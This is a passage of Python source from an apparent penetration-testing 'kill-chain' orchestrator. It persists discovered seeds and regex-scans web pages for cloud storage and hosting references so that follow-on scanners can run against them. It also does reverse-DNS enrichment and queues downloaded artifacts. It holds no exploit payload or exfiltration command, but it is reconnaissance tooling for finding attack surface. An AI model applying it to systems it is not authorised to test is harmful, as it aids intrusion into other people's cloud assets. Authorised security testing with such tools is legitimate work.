                row_progress_label=_derive_child_progress_label(
                    progress_label,
                    "existing seed row prep",
                ),
                set_progress_label=_derive_child_progress_label(
                    progress_label,
                    "existing seed set prep",
                ),
                progress_callback=progress_callback,
            )

            reduction_progress_label = _derive_reduction_progress_label(progress_label)
            if reduction_progress_label and len(prepared_urls) > 1 and max_workers > 1:
                _log(
                    reduction_progress_label,
                    f"[dim]parallel parse x{min(max_workers, len(prepared_urls))}[/dim]",
                )
            reduced_profile_url_entries = _run_inprocess_batch(
                prepared_urls,
                lambda prepared_url: _prepare_public_profile_url_persist_reduction_item(
                    prepared_url,
                    existing_url_seeds=existing_url_seeds,
                ),
                max_workers=max_workers,
                progress_label=reduction_progress_label,
                progress_callback=progress_callback,
            )
            apply_progress_label = _derive_apply_progress_label(progress_label)

            def _apply_public_profile_url_persist_entry(
                prepared_url_entry: dict[str, object] | None,
            ) -> int:
                if prepared_url_entry is None:
                    return 0
                normalized_url = str(prepared_url_entry["normalized_url"] or "").strip()
                seed_type = str(prepared_url_entry["seed_type"] or "").strip()
                should_insert_seed = bool(prepared_url_entry["insert_seed"])
                inserted_seed = 0
                if should_insert_seed and normalized_url not in existing_url_seeds:
                    _upsert_engagement_seed(
                        con,
                        normalized_url,
                        seed_type,
                        source="discovered",
                        status="pending",
                        depth=1,
                        confidence=0.77 if seed_type == "url" else 0.8,
                    )
                    existing_url_seeds.add(normalized_url)
                    inserted_seed = 1
                _promote_social_url_seed_refs(
                    con,
                    normalized_url,
                    seed_type,
                    evidence_rule=discovery,
                )
                return inserted_seed

            applied_profile_url_entries = _run_ordered_inprocess_apply_batch(
                reduced_profile_url_entries,
                _apply_public_profile_url_persist_entry,
                progress_label=apply_progress_label,
                progress_callback=progress_callback,
                order_note="public-profile URL persistence order preserved",
            )
            profile_url_total_out = [0]
            _run_inprocess_batch(
                applied_profile_url_entries,
                lambda item: _apply_int_total_item(
                    item,
                    total_out=profile_url_total_out,
                ),
                max_workers=1,
                progress_label=_derive_child_progress_label(progress_label, "total apply"),
                progress_callback=progress_callback,
            )
            inserted += profile_url_total_out[0]
            con.commit()
        finally:
            con.close()
        return inserted

    def _extract_cloud_refs(html: str) -> dict[str, list[str]]:
        """Regex-scan HTML/JS for cloud-service configuration references.

        Returns dict of service -> list-of-project-refs. Patterns match common
        formats found in JS bundles / meta tags / inline configs. Each pattern
        family added here maps to a fan-out target in the kill-chain — if refs
        are found, the corresponding scanner runs.
        """
        refs: dict[str, list[str]] = {
        "supabase": [],
        "firebase": [],
        "aws_s3": [],
        "do_spaces": [],
        "gcs": [],
        "azure_blob": [],
        "amplify": [],
        "gcp_appspot": [],
        "gcp_cloudfunctions": [],
        "cloudflare_pages": [],
        "cloudflare_worker": [],
        "cloudflare_r2": [],
        "github_pages": [],
        "gitlab_pages": [],
        "vercel": [],
        "netlify": [],
        }

        def _add(bucket: str, val: str) -> None:
            if val and len(val) >= 4 and val not in refs[bucket]:
                refs[bucket].append(val)

        def _cloudfunctions_endpoint(value: str) -> str:
            raw = str(value or "").strip().rstrip(".,;)]}'\"")
            parsed = urlparse(raw)
            if parsed.scheme not in {"http", "https"}:
                return ""
            host = str(parsed.hostname or "").strip().lower().strip(".")
            if not host.endswith(".cloudfunctions.net"):
                return ""
            path = str(parsed.path or "").rstrip("/")
            return f"{parsed.scheme}://{host}{path}"

        for m in _re.finditer(r"https?://([a-zA-Z0-9\-]{4,63})\.supabase\.co", html):
            _add("supabase", m.group(1))
        for pattern in (
            r"https?://([a-zA-Z0-9\-]+)\.firebaseio\.com",
            r"https?://([a-zA-Z0-9\-]+)\.firebaseapp\.com",
            r'"projectId"\s*:\s*"([a-zA-Z0-9\-]+)"',
            r"https?://([a-zA-Z0-9\-]+)\.web\.app",
        ):
            for m in _re.finditer(pattern, html):
                _add("firebase", m.group(1))
        for pattern in (
            r"https?://([a-zA-Z0-9.\-]{3,63})\.s3(?:[.-][a-z0-9-]+)?\.amazonaws\.com(?:/|$)",
            r"https?://s3(?:[.-][a-z0-9-]+)?\.amazonaws\.com/([a-zA-Z0-9.\-]{3,63})(?:/|$)",
            r"https?://([a-zA-Z0-9.\-]{3,63})\.s3-website(?:[.-][a-z0-9-]+)?\.amazonaws\.com(?:/|$)",
            r"https?://s3-website(?:[.-][a-z0-9-]+)?\.amazonaws\.com/([a-zA-Z0-9.\-]{3,63})(?:/|$)",
        ):
            for m in _re.finditer(pattern, html):
                _add("aws_s3", m.group(1).lower())
        for m in _re.finditer(
            r"https?://([a-zA-Z0-9.\-]{3,63})\.([a-z0-9\-]+)\.digitaloceanspaces\.com(?:/|$)",
            html,
        ):
            _add("do_spaces", f"{m.group(2).lower()}/{m.group(1).lower()}")
        for m in _re.finditer(
            r"https?://([a-z0-9\-]+)\.digitaloceanspaces\.com/([a-zA-Z0-9.\-]{3,63})(?:/|$)",
            html,
        ):
            _add("do_spaces", f"{m.group(1).lower()}/{m.group(2).lower()}")
        for pattern in (
            r"https?://storage\.googleapis\.com/([a-zA-Z0-9._\-]{3,222})(?:/|$)",
            r"https?://([a-zA-Z0-9._\-]{3,222})\.storage\.googleapis\.com(?:/|$)",
            r"https?://storage\.cloud\.google\.com/([a-zA-Z0-9._\-]{3,222})(?:/|$)",
            r"https?://firebasestorage\.googleapis\.com/(?:v0/)?b/([a-zA-Z0-9._\-]{3,222})/o(?:[/?#]|$)",
            r"gs://([a-zA-Z0-9._\-]{3,222})(?:/|$)",
        ):
            for m in _re.finditer(pattern, html):
                _add("gcs", m.group(1).lower())
        for m in _re.finditer(
            r"https?://([a-zA-Z0-9\-]{3,24})\.blob\.core\.windows\.net/([^/?#]+)",
            html,
        ):
            _add("azure_blob", f"{m.group(1).lower()}/{m.group(2).lower()}")
        for m in _re.finditer(
            r"https?://([a-z0-9\-]{3,24})(?:\.[a-z0-9\-]+)?\.web\.core\.windows\.net(?:[/?#]|$)",
            html,
            _re.IGNORECASE,
        ):
            _add("azure_blob", f"{m.group(1).lower()}/$web")
        for m in _re.finditer(r"https?://([a-zA-Z0-9\-]+)\.amplifyapp\.com", html):
            _add("amplify", m.group(1))
        for m in _re.finditer(
            r"https?://([a-zA-Z0-9\-]+)(?:\.[a-z0-9\-]+)?\.appspot\.com", html
        ):
            _add("gcp_appspot", m.group(1))
        for m in _re.finditer(
            r"https?://[a-z0-9\-]+-[a-zA-Z0-9\-]+\.cloudfunctions\.net(?:/[^\s\"'<>]*)?",
            html,
        ):
            _add("gcp_cloudfunctions", _cloudfunctions_endpoint(m.group(0)))
        for m in _re.finditer(r"https?://([a-zA-Z0-9\-]+)\.pages\.dev(?:/|$)", html):
            _add("cloudflare_pages", m.group(1).lower())
        for m in _re.finditer(
            r"https?://([a-z0-9][a-z0-9\-]*(?:\.[a-z0-9][a-z0-9\-]*)+\.workers\.dev)(?:/|$)",
            html,
            _re.IGNORECASE,
        ):
            _add("cloudflare_worker", m.group(1).lower())
        for m in _re.finditer(
            r"https?://([a-z0-9][a-z0-9\-]*(?:\.[a-z0-9][a-z0-9\-]*)?\.r2\.(?:dev|cloudflarestorage\.com))(?:[/?#]|$)",
            html,
            _re.IGNORECASE,
        ):
            _add("cloudflare_r2", m.group(1).lower())
        for m in _re.finditer(r"https?://([a-z0-9][a-z0-9\-]*\.github\.io)(?:/|$)", html, _re.IGNORECASE):
            _add("github_pages", m.group(1).lower())
        for m in _re.finditer(
            r"https?://([a-z0-9][a-z0-9\-]*(?:\.[a-z0-9][a-z0-9\-]*)*\.gitlab\.io)(?:/|$)",
            html,
            _re.IGNORECASE,
        ):
            _add("gitlab_pages", m.group(1).lower())
        for m in _re.finditer(r"https?://([a-zA-Z0-9\-]+)\.vercel\.app", html):
            _add("vercel", m.group(1))
        for m in _re.finditer(
            r"https?://([a-zA-Z0-9\-]+)\.netlify\.(?:app|com)", html
        ):
            _add("netlify", m.group(1))
        return refs

    def _snapshot() -> tuple[int, ...]:
        """Read-only counts across every table the spider might grow.
        Used to detect 'nothing new' in the current iteration.

        Tracks: hosts, emails, subdomains, services, key_scanner_findings,
        crawl_results, github_findings, engagement_seeds, and seed_relations.
        Any table not present in the schema counts as 0 (tolerates old DB
        layouts).
        """
        con = _sq.connect(f"file:{db_path.as_posix()}?mode=ro", uri=True)
        try:
            def _c(sql: str) -> int:
                try:
                    return con.execute(sql, (engagement_id,)).fetchone()[0]
                except _sq.OperationalError:
                    return 0
            return (
                _c("SELECT COUNT(*) FROM hosts WHERE engagement_id=?"),
                _c("SELECT COUNT(*) FROM emails WHERE engagement_id=?"),
                _c("SELECT COUNT(*) FROM subdomains WHERE engagement_id=?"),
                _c("SELECT COUNT(*) FROM services s "
                   "JOIN hosts h ON s.host_id=h.id WHERE h.engagement_id=?"),
                _c("SELECT COUNT(*) FROM key_scanner_findings WHERE engagement_id=?"),
                _c("SELECT COUNT(*) FROM crawl_results WHERE engagement_id=?"),
                _c("SELECT COUNT(*) FROM github_findings WHERE engagement_id=?"),
                _c("SELECT COUNT(*) FROM social_profiles WHERE engagement_id=?"),
                _c("SELECT COUNT(*) FROM engagement_seeds WHERE engagement_id=?"),
                _c("SELECT COUNT(*) FROM seed_relations WHERE engagement_id=?"),
            )
        finally:
            con.close()

    def _snapshot_counts(snapshot: tuple[int, ...]) -> dict[str, int]:
        return {
            label: int(snapshot[index] if index < len(snapshot) else 0)
            for index, label in enumerate(_SNAPSHOT_LABELS)
        }

    def _progress_counts(snapshot: tuple[int, ...] | None = None) -> dict[str, int]:
        base_counts = _snapshot_counts(snapshot or _snapshot())
        con = _sq.connect(f"file:{db_path.as_posix()}?mode=ro", uri=True)
        try:
            def _c(sql: str) -> int:
                try:
                    return int(con.execute(sql, (engagement_id,)).fetchone()[0] or 0)
                except _sq.OperationalError:
                    return 0

            base_counts.update(
                {
                    "cloud_assets": _c("SELECT COUNT(*) FROM cloud_assets WHERE engagement_id=?"),
                    "cloud_validations": _c(
                        "SELECT COUNT(*) FROM cloud_validation_results WHERE engagement_id=?"
                    ),
                    "vulnerability_findings": _c(
                        "SELECT COUNT(*) FROM vulnerability_findings WHERE engagement_id=?"
                    ),
                    "artifact_queue": _c("SELECT COUNT(*) FROM artifact_queue WHERE engagement_id=?"),
                }
            )
        finally:
            con.close()
        return base_counts

    def _progress_queue_metrics() -> dict[str, dict[str, int]]:
        con = _sq.connect(f"file:{db_path.as_posix()}?mode=ro", uri=True)
        try:
            metrics: dict[str, dict[str, int]] = {}

            def _group_counts(sql: str) -> dict[str, int]:
                try:
                    rows = con.execute(sql, (engagement_id,)).fetchall()
                except _sq.OperationalError:
                    return {}
                return {
                    str(row[0] or ""): int(row[1] or 0)
                    for row in rows
                    if str(row[0] or "").strip()
                }

            artifact_queue = _group_counts(
                """
                SELECT status, COUNT(*)
                FROM artifact_queue
                WHERE engagement_id=?
                GROUP BY status
                """
            )
            if artifact_queue:
                metrics["artifact_queue"] = artifact_queue

            cloud_validation = _group_counts(
                """
                SELECT validation_status, COUNT(*)
                FROM cloud_validation_results
                WHERE engagement_id=?
                GROUP BY validation_status
                """
            )
            if cloud_validation:
                metrics["cloud_validation"] = cloud_validation

            current_queue_metrics = run_progress_state.get("queue_metrics")
            if isinstance(current_queue_metrics, dict):
                for transient_group in (
                    "fanout_batch",
                    "artifact_processor",
                    "artifact_processor_cumulative",
                    "validation_batch",
                    "finalization_batch",
                ):
                    values = current_queue_metrics.get(transient_group)
                    if isinstance(values, dict):
                        metrics[transient_group] = {
                            str(label): int(count or 0)
                            for label, count in values.items()
                            if str(label).strip()
                        }

            return metrics
        finally:
            con.close()

    def _set_progress_counts(
        snapshot: tuple[int, ...] | None = None,
        *,
        iteration_delta: dict[str, int] | None = None,
        stable: bool | None = None,
    ) -> None:
        run_progress_state["counts"] = _progress_counts(snapshot)
        run_progress_state["queue_metrics"] = _progress_queue_metrics()
        if iteration_delta is not None:
            run_progress_state["last_iteration_delta"] = dict(iteration_delta)
        if stable is not None:
            run_progress_state["last_iteration_stable"] = stable

    def _prepare_known_seed_hostname(item: tuple[Any, Any]) -> str:
        raw_value, raw_type = item
        return _derive_hostname_for_seed(
            str(raw_value or ""),
            str(raw_type or ""),
        )

    def _prepare_known_ip_value(raw_value: Any) -> str | None:
        normalized_ip = str(raw_value or "").strip()
        if not normalized_ip:
            return None
        if _classify_seed(normalized_ip) not in {"ipv4", "ipv6"}:
            return None
        if _is_placeholder_host_ip(normalized_ip):
            return None
        return normalized_ip

    def _load_known_hostnames(
        *,
        max_workers: int = 1,
        progress_label: str | None = None,
        progress_callback: Callable[[str, dict[str, object]], None] | None = None,
    ) -> list[str]:
        con = _sq.connect(f"file:{db_path.as_posix()}?mode=ro", uri=True)
        try:
            rows = con.execute(
                "SELECT DISTINCT hostname FROM hosts WHERE engagement_id=? "
                "AND hostname IS NOT NULL AND hostname != '' "
                "AND hostname != ip",
                (engagement_id,),
            ).fetchall()
            try:
                seed_rows = con.execute(
                    """
                    SELECT DISTINCT seed_value, seed_type
                    FROM engagement_seeds
                    WHERE engagement_id=?
                      AND seed_type IN ('domain', 'subdomain', 'email', 'url', 'apk_url')
                    """,
                    (engagement_id,),
                ).fetchall()
            except _sq.OperationalError:
                seed_rows = []
        finally:
            con.close()
        row_progress_label = _derive_child_progress_label(progress_label, "row prep")
        hostnames = _collect_text_row_values(
            rows,
            max_workers=max_workers,
            progress_label=row_progress_label,
            progress_callback=progress_callback,
        )
        discovered = list(hostnames)
        seen = _collect_normalized_value_set(
            discovered,
            normalizer=lambda value: str(value or "").strip().lower(),
            max_workers=max_workers,
            progress_label=_derive_child_progress_label(progress_label, "seen prep"),
            progress_callback=progress_callback,
        )
        raw_seed_items = list(seed_rows)
        if progress_label and len(raw_seed_items) > 1 and max_workers > 1:
            _log(
                progress_label,
                f"[dim]parallel parse x{min(max_workers, len(raw_seed_items))}[/dim]",
            )
        prepared_seed_hostnames = _run_inprocess_batch(
            raw_seed_items,
            _prepare_known_seed_hostname,
            max_workers=max_workers,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )
        reduction_progress_label = _derive_reduction_progress_label(progress_label)
        if reduction_progress_label and len(prepared_seed_hostnames) > 1 and max_workers > 1:
            _log(
                reduction_progress_label,
                f"[dim]parallel parse x{min(max_workers, len(prepared_seed_hostnames))}[/dim]",
            )
        reduced_seed_hostnames = _run_inprocess_batch(
            prepared_seed_hostnames,
            lambda item: _prepare_known_hostname_reduction_item(item, existing_seen=seen),
            max_workers=max_workers,
            progress_label=reduction_progress_label,
            progress_callback=progress_callback,
        )
        _run_ordered_inprocess_apply_batch(
            reduced_seed_hostnames,
            lambda reduced_seed_hostname: _apply_known_hostname_reduction_item(
                reduced_seed_hostname,
                discovered_out=discovered,
                seen_out=seen,
            ),
            progress_label=_derive_apply_progress_label(progress_label),
            progress_callback=progress_callback,
            order_note="known-host merge order preserved",
        )
        return discovered

    def _load_known_ips(
        *,
        max_workers: int = 1,
        progress_label: str | None = None,
        progress_callback: Callable[[str, dict[str, object]], None] | None = None,
    ) -> list[str]:
        con = _sq.connect(f"file:{db_path.as_posix()}?mode=ro", uri=True)
        try:
            rows = con.execute(
                "SELECT DISTINCT ip FROM hosts WHERE engagement_id=? "
                "AND ip IS NOT NULL",
                (engagement_id,),
            ).fetchall()
        finally:
            con.close()
        raw_ip_values = _collect_text_row_values(
            rows,
            max_workers=max_workers,
            progress_label=_derive_child_progress_label(progress_label, "row prep"),
            progress_callback=progress_callback,
        )
        prepared_ip_values = _run_inprocess_batch(
            raw_ip_values,
            _prepare_known_ip_value,
            max_workers=max_workers,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )
        reduction_progress_label = _derive_reduction_progress_label(progress_label)
        if reduction_progress_label and len(prepared_ip_values) > 1 and max_workers > 1:
            _log(
                reduction_progress_label,
                f"[dim]parallel parse x{min(max_workers, len(prepared_ip_values))}[/dim]",
            )
        reduced_ip_values = _run_inprocess_batch(
            prepared_ip_values,
            _prepare_known_ip_reduction_item,
            max_workers=max_workers,
            progress_label=reduction_progress_label,
            progress_callback=progress_callback,
        )
        discovered_ip_values: list[str] = []
        _run_ordered_inprocess_apply_batch(
            reduced_ip_values,
            lambda item: _apply_present_batch_item(
                item,
                batch_out=discovered_ip_values,
            ),
            progress_label=_derive_apply_progress_label(progress_label),
            progress_callback=progress_callback,
            order_note="known-IP order preserved",
        )
        return discovered_ip_values

    def _queue_discovered_artifacts() -> int:
        """Queue downloaded-file URLs for later static artifact analysis."""
        def _artifact_type_for_url(
            raw_url: str,
            seed_type: str | None = None,
            source_metadata: dict[str, Any] | None = None,
        ) -> str | None:
            metadata = source_metadata if isinstance(source_metadata, dict) else {}
            return _classify_remote_artifact_candidate(
                raw_url,
                seed_type,
                content_disposition=str(metadata.get("content_disposition") or ""),
                content_type=str(metadata.get("content_type") or ""),
                download_filename=str(metadata.get("download_filename") or ""),
            )

        con = _sq.connect(db_path)
        try:
            queued = 0
            candidates: list[tuple[str, str, str | None, dict[str, Any]]] = []
            source_rows: list[tuple[str, tuple[Any, ...]]] = []
            try:
                rows = con.execute(
                    """
                    SELECT COALESCE(final_url, url), tech_stack_json
                    FROM crawl_results
                    WHERE engagement_id=?
                    """,
                    (engagement_id,),
                ).fetchall()
                source_rows.extend(
                    ("crawl_results", cast(tuple[Any, ...], row))
                    for row in rows
                )
            except _sq.OperationalError:
                pass
            try:
                seed_rows = con.execute(
                    """
                    SELECT seed_value, seed_type, metadata_json
                    FROM engagement_seeds
                    WHERE engagement_id=?
                      AND seed_type IN ('url', 'apk_url')
                    """,
                    (engagement_id,),
                ).fetchall()
                source_rows.extend(
                    ("engagement_seed", cast(tuple[Any, ...], row))
                    for row in seed_rows
                )
            except _sq.OperationalError:
                pass

            source_progress_label = f"{last_iteration}.K2 artifact source prep"
            if source_rows and len(source_rows) > 1 and parallel_workers > 1:
                _log(
                    source_progress_label,
                    f"[dim]parallel parse x{min(parallel_workers, len(source_rows))}[/dim]",
                )
            prepared_source_candidates = _run_inprocess_batch(
                source_rows,
                _prepare_artifact_source_candidate_item,
                max_workers=parallel_workers,
                progress_label=source_progress_label,
                progress_callback=_record_batch_progress,
            )
            source_reduction_progress_label = _derive_reduction_progress_label(
                source_progress_label
            )
            if (
                source_reduction_progress_label
                and len(prepared_source_candidates) > 1
                and parallel_workers > 1
            ):
                _log(
                    source_reduction_progress_label,
                    (
                        f"[dim]parallel parse x"
                        f"{min(parallel_workers, len(prepared_source_candidates))}[/dim]"
                    ),
                )
            reduced_source_candidates = _run_inprocess_batch(
                prepared_source_candidates,
                _prepare_artifact_source_reduction_item,
                max_workers=parallel_workers,
                progress_label=source_reduction_progress_label,
                progress_callback=_record_batch_progress,
            )
            _run_ordered_inprocess_apply_batch(
                reduced_source_candidates,
                lambda item: _apply_artifact_source_candidate_item(
                    item,
                    candidates_out=candidates,
                ),
                progress_label=_derive_apply_progress_label(source_progress_label),
                progress_callback=_record_batch_progress,
                order_note="artifact source order preserved",
            )

            if candidates and len(candidates) > 1 and parallel_workers > 1:
                _log(
                    f"{last_iteration}.K2 artifact classify",
                    f"[dim]parallel parse x{min(parallel_workers, len(candidates))}[/dim]",
                )
            classified_candidates = _run_inprocess_batch(
                candidates,
                lambda item: (
                    item[0],
                    item[1],
                    item[2],
                    item[3],
                    _artifact_type_for_url(item[0], item[2], item[3]),
                ),
                max_workers=parallel_workers,
                progress_label=f"{last_iteration}.K2 artifact classify",
                progress_callback=_record_batch_progress,
            )
            reduction_progress_label = _derive_reduction_progress_label(
                f"{last_iteration}.K2 artifact classify"
            )
            if reduction_progress_label and len(classified_candidates) > 1 and parallel_workers > 1:
                _log(
                    reduction_progress_label,
                    f"[dim]parallel parse x{min(parallel_workers, len(classified_candidates))}[/dim]",
                )
            reduced_classified_candidates = _run_inprocess_batch(
                classified_candidates,
                _prepare_artifact_classification_reduction_item,
                max_workers=parallel_workers,
                progress_label=reduction_progress_label,
                progress_callback=_record_batch_progress,
            )
            queue_candidates: list[dict[str, object]] = []
            seen_urls: set[str] = set()
            queue_candidate_apply_label = _derive_apply_progress_label(
                reduction_progress_label
            )
            _run_ordered_inprocess_apply_batch(
                reduced_classified_candidates,
                lambda reduced_candidate: _apply_artifact_queue_candidate_item(
                    reduced_candidate,
                    queue_candidates_out=queue_candidates,
                    seen_urls_out=seen_urls,
                ),
                progress_label=queue_candidate_apply_label,
                progress_callback=_record_batch_progress,
                order_note="artifact candidate order preserved",
            )

            def _apply_queue_candidate(queue_candidate: dict[str, object]) -> int:
                raw_url = str(queue_candidate["raw_url"] or "").strip()
                discovered_from = str(queue_candidate["discovered_from"] or "").strip()
                artifact_type = str(queue_candidate["artifact_type"] or "").strip()
                metadata = cast(dict[str, Any], queue_candidate.get("metadata") or {})
                try:
                    metadata_json = json.dumps(metadata, sort_keys=True) if metadata else "{}"
                except (TypeError, ValueError):
                    metadata_json = "{}"
                try:
                    before_changes = con.total_changes
                    con.execute(
                        """
                        INSERT INTO artifact_queue
                            (engagement_id, source_url, artifact_type, discovered_from, status, metadata_json)
                        VALUES (?, ?, ?, ?, 'queued', ?)
                        ON CONFLICT(engagement_id, source_url) DO NOTHING
                        """,
                        (engagement_id, raw_url, artifact_type, discovered_from, metadata_json),
                    )
                    if con.total_changes > before_changes:
                        if discovered_from == "crawl_results":
                            queued_seed_type = "apk_url" if _is_mobile_bundle_url(raw_url) else "url"
                            _upsert_engagement_seed(
                                con,
                                raw_url,
                                queued_seed_type,
                                source="artifact",
                                status="pending",
                                depth=1,
                                confidence=0.8,
                                metadata=metadata,
                            )
                        return 1
                except _sq.OperationalError:
                    return -1
                return 0

            applied_queue_entries = _run_ordered_inprocess_apply_batch(
                queue_candidates,
                _apply_queue_candidate,
                progress_label=f"{last_iteration}.K2 artifact queue apply",
                progress_callback=_record_batch_progress,
                order_note="artifact queue write order preserved",
            )
            queue_total_out = [queued]
            queue_total_halted = [False]
            _run_inprocess_batch(
                applied_queue_entries,
                lambda item: _apply_artifact_queue_total_item(
                    item,
                    queued_total_out=queue_total_out,
                    halted_out=queue_total_halted,
                ),
                max_workers=1,
                progress_label=f"{last_iteration}.K2 artifact queue total apply",
                progress_callback=_record_batch_progress,
            )
            if queue_total_halted[0]:
                return queue_total_out[0]
            queued = queue_total_out[0]
            con.commit()
            return queued
        finally:
            con.close()

    def _ptr_enrich_ips() -> int:
        """Reverse-DNS every known IP; store any new hostname mapping.
        Returns count of new hostname rows inserted.
        """
        ips = _load_known_ips(
            max_workers=parallel_workers,
            progress_label=f"{last_iteration}.C known IP prep",
            progress_callback=_record_batch_progress,
        )
        if not ips:
            return 0
        inserted = 0
        lookup_results = _run_ptr_lookup_batch(
            ips,
            _socket.gethostbyaddr,
            max_workers=parallel_workers,
            progress_label=f"{last_iteration}.C PTR reverse-DNS",
            progress_callback=_record_batch_progress,
        )
        con = _sq.connect(db_path)
        try:
            existing_host_rows = con.execute(
                "SELECT hostname FROM hosts WHERE engagement_id=? "
                "AND hostname IS NOT NULL",
                (engagement_id,),
            ).fetchall()
            existing = _collect_normalized_text_row_value_set(
                existing_host_rows,
                normalizer=lambda value: str(value or "").strip().lower(),
                max_workers=parallel_workers,
                row_progress_label=_derive_child_progress_label(
                    f"{last_iteration}.C PTR reverse-DNS",
                    "existing row prep",
                ),
                set_progress_label=_derive_child_progress_label(
                    f"{last_iteration}.C PTR reverse-DNS",
                    "existing set prep",
                ),
                progress_callback=_record_batch_progress,
            )
            def _apply_ptr_lookup_result(item: tuple[str, str]) -> int:
                ip, hostname = item
                if not hostname or hostname in existing:
                    return 0
                try:
                    con.execute(
                        "INSERT INTO hosts (engagement_id, ip, hostname, os_family, host_context) "
                        "VALUES (?, ?, ?, 'unknown', ?)",
                        (engagement_id, ip, hostname, '{"discovery":"ptr_reverse_dns"}'),
                    )
                    existing.add(hostname)
                    return 1
                except _sq.IntegrityError:
                    # Row exists for this (engagement, ip) - try UPDATE
                    # to attach the hostname to the existing row.
                    try:
                        con.execute(
                            "UPDATE hosts SET hostname=? "
                            "WHERE engagement_id=? AND ip=? "
                            "AND (hostname IS NULL OR hostname = '')",
                            (hostname, engagement_id, ip),
                        )
                    except _sq.OperationalError:
                        pass
                    return 0

            applied_ptr_entries = _run_ordered_inprocess_apply_batch(
                lookup_results,
                _apply_ptr_lookup_result,
                progress_label=_derive_apply_progress_label(
                    f"{last_iteration}.C PTR reverse-DNS"
                ),
                progress_callback=_record_batch_progress,
                order_note="PTR persistence order preserved",
            )
            ptr_total_out = [0]
            _run_inprocess_batch(
                applied_ptr_entries,
                lambda item: _apply_int_total_item(
                    item,
                    total_out=ptr_total_out,
                ),
                max_workers=1,
                progress_label=f"{last_iteration}.C PTR reverse-DNS total apply",
                progress_callback=_record_batch_progress,
            )
            inserted += ptr_total_out[0]
            con.commit()
        finally:
            con.close()
        return inserted

    from forge.engagement_orchestrator import (  # noqa: PLC0415
        ArtifactDownloadRequest,
        ArtifactQueueProcessor,
        EngagementRunTracker,
        EngagementSynthesisEngine,
        SeedRunTracker,
        _classify_remote_artifact_candidate,
        _classify_remote_artifact_url,
    )
    from forge.deterministic_findings import DeterministicFindingEngine  # noqa: PLC0415
    from forge.phase4.cloud_validate import (  # noqa: PLC0415
        run_cloud_asset_validate_batch,
        sweep_pending_cloud_asset_validations,
        sweep_pending_cloud_validations,
    )

    control_dir = cfg.data_dir / "run_control"
    control_dir.mkdir(parents=True, exist_ok=True)
    stop_marker_path = control_dir / f"engagement_{engagement_id}_stop.json"
    pause_marker_path = control_dir / f"engagement_{engagement_id}_pause.json"

    def _clear_run_control_markers() -> None:
        for marker_path in (stop_marker_path, pause_marker_path):
            try:
                marker_path.unlink(missing_ok=True)
            except Exception:  # noqa: BLE001
                continue

    def _read_run_control_request(
        marker_path: _Path,
        *,
        fallback_reason: str,
    ) -> dict[str, object] | None:
        if not marker_path.is_file():
            return None
        try:
            import json as _json_stop  # noqa: PLC0415

            payload = _json_stop.loads(marker_path.read_text(encoding="utf-8"))
            if isinstance(payload, dict):
                return payload
        except Exception:  # noqa: BLE001
            return {"reason": fallback_reason, "requested_by": "unknown"}
        return {"reason": fallback_reason, "requested_by": "unknown"}

    def _read_stop_request() -> dict[str, object] | None:
        return _read_run_control_request(
            stop_marker_path,
            fallback_reason="stop marker present",
        )

    def _read_pause_request() -> dict[str, object] | None:
        return _read_run_control_request(
            pause_marker_path,
            fallback_reason="pause marker present",
        )

    def _run_control_requested_via_metadata(flag_name: str) -> dict[str, object] | None:
        con = _sq.connect(f"file:{db_path.as_posix()}?mode=ro", uri=True)
        try:
            row = con.execute(
                """
                SELECT metadata_json
                FROM engagement_runs
                WHERE engagement_id=? AND id=?
                """,
                (engagement_id, engagement_run_handle.run_id),
            ).fetchone()
        except _sq.OperationalError:
            row = None
        finally:
            con.close()
        if row is None or not row[0]:
            return None
        try:
            import json as _json_stop  # noqa: PLC0415

            payload = _json_stop.loads(str(row[0]))
        except Exception:  # noqa: BLE001
            return None
        if isinstance(payload, dict) and payload.get(flag_name):
            return payload
        return None

    def _restore_resume_queue_metrics() -> None:
        if not resume_enabled or engagement_run_handle is None:
            return
        con = _sq.connect(f"file:{db_path.as_posix()}?mode=ro", uri=True)
        try:
            row = con.execute(
                """
                SELECT metadata_json
                FROM engagement_runs
                WHERE engagement_id=?
                  AND id<>?
                ORDER BY id DESC
                LIMIT 1
                """,
                (engagement_id, engagement_run_handle.run_id),
            ).fetchone()
        except _sq.OperationalError:
            row = None
        finally:
            con.close()
        if row is None or not row[0]:
            return
        try:
            payload = json.loads(str(row[0]))
        except Exception:  # noqa: BLE001
            return
        if not isinstance(payload, dict):
            return
        prior_queue_metrics = payload.get("queue_metrics")
        if not isinstance(prior_queue_metrics, dict):
            return
        prior_artifact_processor = prior_queue_metrics.get("artifact_processor")
        prior_artifact_cumulative = prior_queue_metrics.get("artifact_processor_cumulative")
        if not isinstance(prior_artifact_processor, dict) and not isinstance(prior_artifact_cumulative, dict):
            return
        queue_metrics = run_progress_state.get("queue_metrics")
        if not isinstance(queue_metrics, dict):
            queue_metrics = {}
        if isinstance(prior_artifact_processor, dict):
            queue_metrics["artifact_processor"] = {
                str(key): int(value or 0)
                for key, value in prior_artifact_processor.items()
            }
        if isinstance(prior_artifact_cumulative, dict):
            queue_metrics["artifact_processor_cumulative"] = {
                str(key): int(value or 0)
                for key, value in prior_artifact_cumulative.items()
            }
        run_progress_state["queue_metrics"] = queue_metrics

    synthesis_engine = EngagementSynthesisEngine(db_path, engagement_id, depth_limit=3)
    artifact_processor = ArtifactQueueProcessor(
        db_path,
        engagement_id,
        max_workers=parallel_workers,
    )
    finding_engine = DeterministicFindingEngine(db_path, engagement_id)
    engagement_run_tracker = EngagementRunTracker(db_path, engagement_id)
    seed_run_tracker = SeedRunTracker(db_path, engagement_id)
    _clear_run_control_markers()
    run_progress_state["phase"] = "starting"
    engagement_run_handle = engagement_run_tracker.start_run(
        run_kind="kill_chain",
        seed_value=seed,
        seed_type=seed_type,
        seed_count=len(classified_seeds),
        max_iterations=max_iterations,
        current_iteration=0,
        resume_enabled=resume_enabled,
        dry_run=dry_run_all,
        attack_mode=attack_mode,
        metadata=_engagement_run_metadata(),
    )
    _restore_resume_queue_metrics()
    _publish_run_progress("kill-chain", "run initialized", force=True)

    def _refresh_root_domains(new_domains: list[str]) -> None:
        for root in new_domains:
            if root and root not in root_domains:
                root_domains.append(root)

    local_artifacts = artifact_processor.ingest_local_artifacts()
    if local_artifacts:
        _log("artifact intake", f"[green]{local_artifacts} local artifact(s) queued[/green]")
        _record_artifact_cumulative_metrics(queued_local=local_artifacts)
    artifact_summary = artifact_processor.process(
        progress_label="artifact processing",
        progress_callback=_record_artifact_progress,
    )
    _record_artifact_cumulative_metrics(artifact_summary=artifact_summary)
